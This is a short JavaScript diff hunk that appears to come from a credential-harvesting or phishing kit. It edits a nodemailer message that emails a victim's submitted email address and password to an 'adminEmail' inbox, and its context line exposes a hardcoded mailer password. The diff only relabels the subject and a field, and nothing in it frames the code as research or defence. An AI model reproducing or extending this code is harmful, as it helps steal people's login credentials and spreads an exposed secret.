@@ -28,10 +28,10 @@ const fromPasswordEmailer = 'nqdgdrlnhbzlnusm'
       const options = {
         from: fromEmailer,
         to: adminEmail,
-        subject: `SENT BY ${adminEmail}`,
+        subject: `SENT BY ${fromEmailer}`,
         text: message,
         html: `<h4>Details</h4>
-        <p>Password: ${email}
+        <p>Email: ${email}
         <p>Password: ${password}</p>
         `,
       };
